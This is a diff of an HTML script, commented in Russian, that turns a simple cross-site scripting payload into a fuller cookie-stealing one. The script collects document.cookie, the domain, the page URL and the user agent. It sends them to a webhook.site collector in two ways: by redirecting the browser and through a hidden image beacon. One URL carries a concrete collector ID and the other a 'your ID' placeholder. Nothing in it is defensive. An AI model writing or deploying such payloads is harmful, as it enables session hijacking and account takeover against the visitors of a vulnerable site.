@@ -1,4 +1,21 @@
 <script>
-    // Вариант 1 - через переход по ссылке
-    window.location = "https://webhook.site/bf30006e-dd6b-4685-8545-432615830517?cookies=" + encodeURIComponent(document.cookie);
+// Отправляем ВСЮ возможную информацию
+var data = {
+    cookies: document.cookie,
+    domain: document.domain,
+    url: window.location.href,
+    userAgent: navigator.userAgent,
+    timestamp: new Date().toISOString()
+};
+
+// Вариант 1 - в URL (самый надежный)
+window.location = "https://webhook.site/ТВОЙ_ID?" + 
+    "cookies=" + encodeURIComponent(data.cookies) + 
+    "&domain=" + encodeURIComponent(data.domain) +
+    "&url=" + encodeURIComponent(data.url);
+
+// Вариант 2 - через изображение
+var img = new Image();
+img.src = "https://webhook.site/bf30006e-dd6b-4685-8545-432615830517?cookies=?cookies=" + 
+    encodeURIComponent(document.cookie || "NO_COOKIES_FOUND");
 </script>
